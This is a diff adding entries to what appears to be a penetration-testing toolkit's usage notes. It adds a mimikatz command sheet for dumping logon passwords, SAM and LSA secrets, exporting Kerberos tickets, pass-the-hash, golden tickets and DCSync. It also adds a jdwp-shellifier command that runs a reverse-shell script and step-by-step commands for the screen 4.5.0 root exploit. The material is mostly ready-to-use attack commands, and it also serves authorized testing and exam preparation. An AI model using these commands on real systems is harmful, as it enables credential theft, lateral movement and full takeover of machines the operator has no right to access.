@@ -95,6 +95,43 @@ svc bloodhound-ce
 ## Path: windows/windows-resources/mimikatz
 ## Shortcut: windows_mimikatz
 ## Usage:
+```powershell
+# ref: https://www.wwt.com/api-new/attachments/66a7b8da13599902a3aa53a9/file
+
+# one-liner format
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"  exit > mimikatz.txt
+
+# commands
+privilege::debug    # enable debug priv
+log <logfile>       # log to <logfile>. e.g., log output.txt
+
+sekurlsa::logonpasswords full   # display all available logon passwords. with full - more detailed
+sekurlsa::tickets /export       # export all kerberos tickets
+sekurlsa::pth /user:[username] /domain:[domain] /ntlm:[ntlm_hash] /run:[command] # pass the hash
+
+kerberos::list /export          # list and export kerberos tickets
+kerberos::ptt [ticket_file]     # pass a kerberos ticket, e.g., "kerberos::ptt c:\\\\ticket.kirbi"
+
+kerberos::golden /user:[username] /domain:[domain] /sid:[sid] /krbtgt:[krbtgt_hash] /ticket:[ticket_file] # Golden Ticket
+# e.g., kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-... /krbtgt:123456... /ticket:golden.kirbi
+
+crypto::certificates /export    # export certificates
+crypto::keys /export            # export cryptographic keys
+vault::cred                     # list credentials stored in Windows Vault.
+token::elevate                  # elevate the current token privileges.
+lsadump::sam                    # dump the SAM database for password hashes.
+lsadump::secrets                # dump LSA secrets
+
+lsadump::dcsync /user:[domain\\\\username] /domain:[domain] # erform a DC Sync attack and retrieve hashes.
+# e.g., lsadump::dcsync /user:example\\\\krbtgt /domain:example.com
+
+sekurlsa::pth /user:[username] /domain:[domain] /ntlm:[ntlm_hash] # pass-the-hash attack using NTLM hash.
+kiwi_cmd sekurlsa::pth /user:[username] /domain:[domain] /aes256:[aes256_hash] # pass-the-hash attack using AES256 hash.
+
+kerberos::tgt                   # retrieve the TGT (Ticket Granting Ticket).
+kerberos::purge                 # purge all Kerberos tickets.
+```
+
 
 # Utils: Spray-Passwords.ps1
 ## Description: Windows Spary Password (OSCP 22.2.1.) 
@@ -151,3 +188,34 @@ So far the vulnerability has been patched in the following Linux kernel versions
 
 ```
 
+# Utils: jdwp-shellifier
+## Description: exploit jdwp
+## Path: service/jdwp-shellifier
+## Shortcut: service_jdwp_shellifier
+## Usage:
+```bash
+python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "bash /tmp/reverse-shell.sh"
+
+# you will need to trigger the actibity (by default, nc the port)
+```
+# Utils: screen-v4.5.0-priv-escalate
+## Description: screen 4.5.0 exploit 
+## Path: CVE/screen-v4.5.0-priv-escalate
+## Shortcut: CVE_screen_4_5_0
+## Usage:
+```bash
+# ref: https://github.com/YasserREED/screen-v4.5.0-priv-escalate/tree/main
+
+# first drop the files
+ship $CVE_screen_4_5_0/libhax.so $CVE_screen_4_5_0/rootshell
+
+chmod +x libhax.so
+chmod +x rootshell
+
+# execution
+cd /etc || exit 1
+umask 000
+screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+screen -ls
+/tmp/rootshell
+```
